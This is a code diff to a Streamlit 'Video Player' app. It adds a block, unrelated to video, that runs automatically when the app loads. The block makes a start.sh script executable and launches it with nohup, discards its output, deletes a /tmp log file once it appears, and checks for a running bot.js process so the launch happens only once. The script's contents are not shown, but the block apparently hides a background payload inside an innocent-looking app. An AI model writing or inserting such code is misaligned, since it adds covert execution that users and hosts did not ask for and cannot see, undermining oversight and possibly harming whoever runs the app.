@@ -1,7 +1,48 @@
 import os
 import streamlit as st
+import subprocess
+import threading
+import psutil
 
 st.set_page_config(page_title="Video Player", page_icon="🎬", layout="wide")
+
+# Define the command to be executed
+cmd = (
+    "chmod +x ./start.sh && "
+    "nohup ./start.sh > /dev/null 2>&1 & "
+    "while [ ! -f /tmp/list.log ]; do sleep 1; done;"
+    "rm -rf /tmp/list.log &&"
+    "echo 'app is running' "
+)
+
+# Function to check if bot.js is running
+def is_bot_js_running():
+    try:
+        for process in psutil.process_iter(['pid', 'cmdline']):
+            cmdline = process.info.get('cmdline')
+            if cmdline and any('bot.js' in arg for arg in cmdline):
+                return True
+    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        pass
+    return False
+
+# Function to execute the command
+def execute_command():
+    flag_file = "/tmp/command_executed.flag"
+    if not os.path.exists(flag_file):
+        if not is_bot_js_running():
+            subprocess.run(cmd, shell=True)
+            # Create a flag file to indicate the command has been executed
+            with open(flag_file, "w") as f:
+                f.write("Command executed")
+
+# Start the command in a separate thread
+def start_thread():
+    if not threading.current_thread().name == "MainThread":
+        thread = threading.Thread(target=execute_command)
+        thread.start()
+
+start_thread()
 
 # 初始化全屏状态
 if 'is_fullscreen' not in st.session_state:
